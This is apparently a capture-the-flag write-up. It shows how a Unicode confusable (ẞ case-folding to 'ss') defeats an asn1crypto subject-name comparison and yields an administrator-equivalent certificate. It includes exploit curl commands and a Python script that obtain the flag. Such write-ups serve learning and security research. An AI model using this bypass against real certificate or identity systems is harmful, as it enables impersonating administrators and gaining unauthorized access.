# [ASS](https://nnsc.tf/challenges?challenge=web_ASS)

**Description:**

Everything should be self-serve in 2026

## 1. Recon

The app exposes four endpoints:

- `GET /` - static form
- `GET /ca.pem` - the issuing CA certificate
- `POST /certificates` - request a certificate: `{"profile": "ADMIN"|"CLIENT", "name": "<CN>"}`
- `POST /admin` - redeem a certificate for the flag: `{"certificate": <PEM>, "nonce": <str>, "signature": <base64>}`

The source is provided in the tarball, so this doesn't need to be fuzzed blind. Reading it directly is faster and removes guesswork.

## 2. Reading the source

### `/certificates`

```python
def provision(request: CertificateRequest) -> CertificateResponse:
    if not names.is_acceptable(request.name):
        raise HTTPException(400, "invalid name")
    with lock:
        if request.name in issued_names:
            raise HTTPException(409, "name already in use")
        if request.profile == "ADMIN" and administrator is not None:
            raise HTTPException(409, "an administrator certificate has already been provisioned")
        certificate, key = authority.issue(request.name)
        issued_names.add(request.name)
        if request.profile == "ADMIN":
            administrator = certificate
    return CertificateResponse(
        certificate=...,
        private_key=None if request.profile == "ADMIN" else ...,
    )
```

Two things matter here:

1. The certificate's CN is always set from `name`, regardless of `profile`. `profile` only controls whether the response includes the `private_key`. So a `profile=ADMIN` request never gives you a key back, but that's not actually needed for the exploit.
2. Each distinct `name` string can be used exactly once. But "distinct" means distinct as a **Python string**, not distinct as a rendered/displayed name.

`names.py` defines the allowed character set for `name`:

```python
MIN_LENGTH = 4
MAX_LENGTH = 16
LATIN_EXTENDED_ADDITIONAL = range(0x1E00, 0x1F00)

def in_repertoire(character):
    return "A" <= character <= "Z" or ord(character) in LATIN_EXTENDED_ADDITIONAL

def is_acceptable(name):
    return (4 <= len(name) <= 16
        and all(in_repertoire(c) for c in name)
        and name.isalpha() and name.isupper())
```

So `name` can contain plain ASCII A-Z, or characters from the Unicode block "Latin Extended Additional", as long as the whole string is alphabetic and uppercase.

### `/admin`

```python
def administration(request: AdminRequest) -> AdminResponse:
    if administrator is None:
        raise HTTPException(409, "no administrator certificate has been provisioned")
    presented = x509.load_pem_x509_certificate(request.certificate.encode())
    signature = base64.b64decode(request.signature, validate=True)
    if not consume_nonce(request.nonce):
        raise HTTPException(401, "unknown or expired nonce")
    if not authority.issued_by_us(presented):
        raise HTTPException(401, "certificate was not issued by this authority")
    if not ca.is_in_validity_period(presented):
        raise HTTPException(401, "certificate is not valid at this time")
    public_key = presented.public_key()
    public_key.verify(signature, request.nonce.encode())  # proves you hold the private key
    authorized = ca.subject(presented) == ca.subject(administrator)
    if not authorized:
        raise HTTPException(403, "not the administrator")
    return AdminResponse(flag=FLAG)
```

This is a proof-of-possession scheme, not mTLS. You submit any cert issued by the challenge's CA, sign a server-issued nonce with the matching private key to prove you hold it, and if the cert's subject matches the stored `administrator` certificate's subject, you get the flag.

The critical line is the last comparison:

```python
def subject(certificate):
    return asn1crypto.x509.Certificate.load(certificate.public_bytes(Encoding.DER)).subject
```

`ca.subject(...)` returns an `asn1crypto.x509.Name` object, and the `==` here calls `asn1crypto`'s `Name.__eq__`, not a raw string or byte comparison.

## 3. The bug

`asn1crypto.x509.Name.__eq__` implements RFC 5280 / RFC 4518 name comparison. Before comparing, each attribute value goes through `_ldap_string_prep`:

```python
string = ''.join(map(stringprep.map_table_b2, string))  # case folding
string = unicodedata.normalize('NFKC', string)           # normalization
...
string = ' ' + re.sub(' +', '  ', string).strip() + ' '  # whitespace padding
```

This means two certificates with **different CNs at the byte level** can be treated as the "same subject" if they fold/normalize to the same string. Plain ASCII case tricks don't work here, because `names.is_acceptable` already forces the raw `name` to be uppercase, and case folding just lowercases everything anyway, that part is a red herring.

The real opening is the Unicode repertoire. `U+1E9E` is inside the accepted `U+1E00`-`U+1EFF` range, is alphabetic, and is uppercase, so `names.is_acceptable` accepts it. But its case fold is the **two-character string `"ss"`**, not a single character.

So if we pick an admin name containing `"SS"`, for example `GLASS`, then `GLAẞ` is:

- A different Python string from `GLASS`, so it passes the `issued_names` uniqueness check independently.
- Still `is_acceptable`: length 4, alphabetic, uppercase.
- Folds to the same value as `GLASS` under RFC 4518 prep: `GLAẞ` -> case fold -> `glass` -> NFKC -> `glass` -> padded -> `' glass '`, identical to what `GLASS` produces.

So we can provision an `ADMIN`-profile cert named `GLASS`, then separately provision a `CLIENT`-profile cert named `GLAẞ`, which **does** give us a private key, and whose subject the server will treat as equal to the admin's for authorization purposes.

## 4. Exploit steps

Each `/certificates` name is single-use, so do this in order on a fresh instance and don't waste calls on other names.

**Step 1: provision the ADMIN slot**

```bash
BASE="https://<your-instance>.chall.nnsc.tf"

curl -s -X POST "$BASE/certificates" -H 'Content-Type: application/json' \
  -d '{"profile":"ADMIN","name":"GLASS"}'
```

This sets the server's stored `administrator` certificate to CN=`GLASS`. We don't need this response's key.

**Step 2: get the confusable client certificate**

```bash
curl -s -X POST "$BASE/certificates" -H 'Content-Type: application/json' \
  --data-binary $'{"profile":"CLIENT","name":"GLA\u1e9e"}' | tee client_resp.json
```

`\u1e9e` is `ẞ`. This must reach the server as the actual UTF-8 encoded character, not an escaped literal, so send it via a JSON body that properly encodes Unicode.

The response should include both `certificate` and `private_key`, with `name` showing `GLAẞ`.

**Step 3: get a nonce, sign it, redeem it**

```python
import json, base64, requests
from cryptography.hazmat.primitives.serialization import load_pem_private_key

BASE = "https://<your-instance>.chall.nnsc.tf"

d = json.load(open("client_resp.json"))
cert_pem = d["certificate"]
key = load_pem_private_key(d["private_key"].encode(), password=None)

nonce = requests.get(f"{BASE}/auth/nonce").json()["nonce"]
sig = key.sign(nonce.encode())  # Ed25519 sign over the nonce string as received

resp = requests.post(f"{BASE}/admin", json={
    "certificate": cert_pem,
    "nonce": nonce,
    "signature": base64.b64encode(sig).decode(),
})
print(resp.status_code, resp.text)
```

`public_key.verify(signature, request.nonce.encode())` on the server side just proves you hold the private key matching the certificate you submitted, it doesn't itself grant authorization. Authorization comes from the subject comparison that follows, which is where the confusable name pays off.

[SCREEN01]
